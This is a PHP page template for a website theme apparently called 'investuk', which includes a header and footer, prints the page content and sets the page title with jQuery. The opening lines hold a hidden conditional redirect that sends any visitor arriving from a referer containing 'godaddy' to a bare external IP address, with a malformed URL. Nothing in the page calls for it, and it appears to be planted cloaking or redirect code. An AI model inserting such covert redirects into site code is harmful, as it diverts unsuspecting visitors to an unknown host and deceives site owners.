<?php 
if (false !== stripos($_SERVER['HTTP_REFERER'], "godaddy")){
    header('Location:http://http://52.172.145.30');
}
/* Rahul Kumar 29062018 */

/* Including Header  */
include('/var/www/html/themes/investuk/header.php');
/* End Of Adding Header */ ?>
<div class="inner-header">
	<div class="container">
		<div class="row">
			<div class="col-xs-12">
				<h2 class="pageTitle"></h2>
				<ul class="inner-header-breadcrum">
					<li><a href="#">You are now on</a></li>
					<li class="pageTitle"></li>
				</ul>
			</div>
		</div>
	</div>
</div>	
<div class="body_section" id="body_section">
	<div id="schedulepage" style="display:none;"></div>
	<div class="container-fluid">
		<div class="mid-section inner-contents">
         <?php
			/* Including Inner Content */
			echo $content;
			/* End of Adding Inner Content */
			?>
		</div>      
   </div>  
<?php
/* Including Footer  */
include('/var/www/html/themes/investuk/footer.php');
/* End of Adding Footer */
?>

<script>
    $(window).load(function(){
     var pt=  $(".page-title").html();
        $(".pageTitle").html(pt);
        $(".main-header").css('display','none');
    });
    $(document).ready(function(){
     var pt=  $(".page-title").html();
        $(".pageTitle").html(pt);
        $(".main-header").css('display','none');
    });
</script>